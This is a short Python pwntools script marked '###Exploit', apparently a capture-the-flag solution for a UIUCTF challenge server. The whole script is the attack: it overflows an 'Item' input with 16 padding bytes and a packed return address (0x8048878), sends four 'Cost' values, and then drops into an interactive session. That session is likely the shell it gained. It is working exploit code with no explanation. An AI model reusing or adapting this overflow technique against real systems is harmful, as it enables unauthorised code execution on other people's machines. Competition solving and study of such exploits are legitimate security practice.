from pwn import *

###Exploit
r = remote('chal.uiuc.tf',2001)

r.sendafter('Item: ',b'a'*0x10+p64(0x8048878))
r.sendlineafter('Cost: ',str(0x1a))
r.sendlineafter('Cost: ',str(0x1b))
r.sendlineafter('Cost: ',str(0x15))
r.sendlineafter('Cost: ',str(0x18))
r.interactive()
